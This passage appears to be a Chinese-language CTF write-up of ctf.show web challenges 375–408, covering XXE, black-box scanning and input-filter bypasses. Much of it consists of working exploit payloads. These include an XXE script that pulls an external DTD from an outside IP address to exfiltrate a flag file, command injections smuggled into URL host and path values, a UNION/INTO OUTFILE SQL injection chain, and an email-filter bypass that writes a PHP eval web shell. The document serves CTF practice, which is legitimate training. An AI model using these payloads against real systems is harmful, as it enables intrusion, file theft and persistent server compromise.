highlight_file(__FILE__);    
```

就是文件里面需要没有<font style="color:rgb(77, 77, 77);">xml和version=1或0</font>

<font style="color:rgb(77, 77, 77);">但其实没有什么区别，直接上一道题目的payload就行</font>

## <font style="color:rgb(77, 77, 77);">376</font>

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

和上面一道题目差不多，就是加了一个大小写判定

所以直接再来

## 377

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);  
```

过滤了http，<font style="color:rgb(77, 77, 77);">可以使用utf-16编码进行绕过</font>

```php
import requests
url = 'http://0ec4fe9d-6949-4e9d-a3b1-70be3bb3f01b.challenge.ctf.show/'
payload = '''
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://43.129.27.97:206/xxe.dtd">
%aaa;
]>
<root>123</root>
]>
'''
payload = payload.encode('utf-16')
rep = requests.post(url=url, data=payload)
print(rep.text)
```

直接传上去以后就可以直接在服务器里面看了

## 378

![1764215087195-3be10def-016f-4a30-91b3-4b6ff1019f1c.png](./img/CnfOBJ-v8acdaBX2/1764215087195-3be10def-016f-4a30-91b3-4b6ff1019f1c-362133.png)

打开发现是一个登录页面

抓包后发现回显xml 形式，而且是回显 username的值

抓包写入payload:

```php
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY file SYSTEM "file:///flag">
]>
<user>
<username>&file;</username>
<password>123</password>
</user>
```

即可得到flag

# 黑盒测试

380

打开发现是一个网站，点来点去发现不了注入点，于是选择dirsearch扫描一下

```php
[22:42:46] Scanning:
[22:43:45] 200 -     0B - /flag.php
[22:44:00] 200 -   119B - /page.php
```

flag.php里面什么都没有

打开page.php看一下

![1764254738454-4e7674f9-cc56-4594-b348-95f6fb34ca19.png](./img/CnfOBJ-v8acdaBX2/1764254738454-4e7674f9-cc56-4594-b348-95f6fb34ca19-313346.png)

应该是需要输入get参数才能打开

输入一个1看一下结果

![1764254779229-a6bd61b2-d649-499c-a2f3-c01cfc10d95b.png](./img/CnfOBJ-v8acdaBX2/1764254779229-a6bd61b2-d649-499c-a2f3-c01cfc10d95b-972623.png)

确定了是file\_get\_contents函数，那就尝试一下伪协议

因为他会自己拼接一个php上去，所以我的伪协议就不包含.php

```php
?id=php://filter/read=convert.base64-encode/resource=flag
```

输入进去成功输出来一个base64字符串

解码一下拿到flag

381

依旧是扫描一下

```php
[22:51:11] Scanning:
[22:52:18] 200 -    24B - /page.php
```

只剩下一个了，那么打开看一下

![1764255177535-1c5aac13-313f-4821-9f7c-c7308440b4c9.png](./img/CnfOBJ-v8acdaBX2/1764255177535-1c5aac13-313f-4821-9f7c-c7308440b4c9-533504.png)

好像不太对劲，输入id会显示出来网页，但是看不出来什么

从提示看应该不是sql注入，没有sql注入是这样子的

尝试一下循环调用，发现什么都没有

![1764255329442-baed5e1b-2058-4f5b-ab30-00cf628bfa7f.png](./img/CnfOBJ-v8acdaBX2/1764255329442-baed5e1b-2058-4f5b-ab30-00cf628bfa7f-992544.png)

看源代码发现一堆路径

![1764255496711-61a335c6-d74f-4f76-ab2a-232243405cd8.png](./img/CnfOBJ-v8acdaBX2/1764255496711-61a335c6-d74f-4f76-ab2a-232243405cd8-735030.png)

依次尝试就能找到后台的地址，他会直接给你flag

![1764255527016-70f2a2e4-b96f-4460-a5a5-934a9df40982.png](./img/CnfOBJ-v8acdaBX2/1764255527016-70f2a2e4-b96f-4460-a5a5-934a9df40982-140179.png)

382

扫描一下发现有个网址

\[23:16:04] Scanning: alsckdfy/

\[23:17:12] 200 -     5B - /alsckdfy/check.php

\[23:17:15] 200 -     0B - /alsckdfy/config.php

\[23:17:20] 301 -   169B - /alsckdfy/css  ->  <http://b0144cf1-d617-487a-963f-04d0dbddaa6d.challenge.ctf.show/alsckdfy/css/>

\[23:17:39] 301 -   169B - /alsckdfy/images  ->  <http://b0144cf1-d617-487a-963f-04d0dbddaa6d.challenge.ctf.show/alsckdfy/images/>

\[23:17:41] 200 -    2KB - /alsckdfy/index.php

# 其他-特殊绕过
## 396
```php
<?php
error_reporting(0);  
if(isset($_GET['url'])){    $url = parse_url($_GET['url']);    shell_exec('echo '.$url['host'].'> '.$url['path']);  
  
}else{    highlight_file(__FILE__);  
}
```
看起来就是把输入的直接输出到指定的文件夹下
忘记了，可以截断。。。
?url=127.0.0.1/123;ls > 1.txt
因为这个有查看的权限，所以直接输出就行了
parse_url是一个url提取函数，这里直接写就可以了
然后通过cp赋值flag出来直接看就行了
最后的`>`不看也行
?url=1|cp fl0g.php 2.txt
举个例子
```
`'http://username:password@hostname:9090/path?arg=value#anchor'`
array(8) {
  ["scheme"]=>
  string(4) "http"
  ["host"]=>
  string(8) "hostname"
  ["port"]=>
  int(9090)
  ["user"]=>
  string(8) "username"
  ["pass"]=>
  string(8) "password"
  ["path"]=>
  string(5) "/path"
  ["query"]=>
  string(9) "arg=value"
  ["fragment"]=>
  string(6) "anchor"
}
string(4) "http"
string(8) "username"
string(8) "password"
string(8) "hostname"
int(9090)
string(5) "/path"
string(9) "arg=value"
string(6) "anchor"
```
## 397
```php
<?php
error_reporting(0);  
if(isset($_GET['url'])){    $url = parse_url($_GET['url']);    shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);  
  
}else{    highlight_file(__FILE__);  
}
```
好像和上面一道题目差不多，尝试一下
确实可以出来
这里面多出来一个tmp，但是只需要你直接忽略就行了
## 398
```php
<?php
error_reporting(0);  
if(isset($_GET['url'])){    $url = parse_url($_GET['url']);  
    if(!preg_match('/;/', $url['host'])){        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);  
    }  
  
}else{    highlight_file(__FILE__);  
}
```
和前面两道题目没有本质区别
## 399
没有任何区别
## 400
跳过，没有任何区别
## 401
没有任何区别
## 402
```php
<?php  
if(isset($_GET['url'])){    $url = parse_url($_GET['url']);    var_dump($url);  
    if(preg_match('/http|https/i', $url['scheme'])){  
        die('error');  
    }  
    if(!preg_match('/;|>|\||base/i', $url['host'])){        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);  
    }  
  
}else{    highlight_file(__FILE__);  
}
```
看起来好像有了什么区别
会检测一下scheme
```
${IFS}
< > 某些重定向组合
Tab 字符
换行
\ 反斜杠转义空格
引号拼接，如：
```
他会报错，但是其实什么事情也没有
根本就没有scheme，但是没有关系，是匹配的报错
直接复制上面的题解
## 403
```php
<?php  
error_reporting(0);  
if(isset($_GET['url'])){    $url = parse_url($_GET['url']);  
    if(preg_match('/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$/', $url['host'])){        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);  
    }  
  
}else{    highlight_file(__FILE__);  
}
```
发现有一个检测，是不是正常的host的检测
但是其实可以直接绕过的
这里一定是需要scheme的，没有一个检测
`?url=http://127.0.0.1/1|cp fl0g.php 1.txt`
## 404
同上
## 405
```php
<?php
error_reporting(0);  
if(isset($_GET['url'])){    $url = parse_url($_GET['url']);  
    if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){  
        if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){  
            if(preg_match('/\~|\.|php/', $url['scheme'])){                shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);  
            }  
              
        }  
    }  
  
}else{    highlight_file(__FILE__);  
    echo 'parse_url 好强大';  
}
```
检测了scheme要有php，检测了path只能用字符和数字组成，host要有一个正常的ip
那么可以把注入的东西写在host里面
注意一下shell语句记得用;闭合就行
`?url=php://127.0.0.1;cp fl0g.php 1.txt;/1`
## 406
```php
<?php  
require 'config.php';  
//flag in db  
highlight_file(__FILE__);  
$url=$_GET['url'];  
if(filter_var ($url,FILTER_VALIDATE_URL)){    $sql = "select * from links where url ='{$url}'";    $result = $conn->query($sql);  
}else{  
    echo '不通过';  
}
```
通过构造一个url可以绕过
`?url=http://yuanshen/'or'1'='1`
通过这个可以逃逸
但是问题是没有回显
所以我们可以直接使用outfile输出到文件中
注意一下这个link里面可能一个值也没有，需要union联合注入，而union注入要求是行数相同
需要写一个concat来对于结果进行合并
```
?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/into/**/outfile/**/'/var/www/html/3.txt#
```
先测试出来输出的结果是几行
这个里面最后会合并一个'，注意一下不能把#写进字符串去，可能不会解析
```
可以爆库名也可以不爆因为一般都是在当前数据库，所以我就没有爆
爆表名
?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/into/**/outfile/**/'/var/www/html/3.txt#
爆列名
?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'/**/into/**/outfile/**/'/var/www/html/9.txt#
爆flag
?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(flag)/**/from/**/flag/**/into/**/outfile/**/'/var/www/html/6.txt#
```
最终利用的方案
## 407
```php
<?php   
highlight_file(__FILE__);  
error_reporting(0);  
$ip=$_GET['ip'];  
  
if(filter_var ($ip,FILTER_VALIDATE_IP)){    call_user_func($ip);  
}  
  
class cafe{  
    public static function add(){  
        echo file_get_contents('flag.php');  
    }  
}
```
直接cafe::add就能绕过
这个是回调字符串格式，能调用类的方法
## 408
```php
<?php  
highlight_file(__FILE__);  
error_reporting(0);  
$email=$_GET['email'];  
  
if(filter_var ($email,FILTER_VALIDATE_EMAIL)){    file_put_contents(explode('@', $email)[1], explode('@', $email)[0]);  
}
```
explode('@', $email)
用@将参数分开并且将，@之前的写入，@之后的文件
filter_var ($email,FILTER_VALIDATE_EMAIL)
检查是否为正常的IP，这里我们可以使用双引号绕过
GET：
而且有空格格式就不对所以小马得这么写
`?email="<?=eval($_POST[1])?>"@1.php`


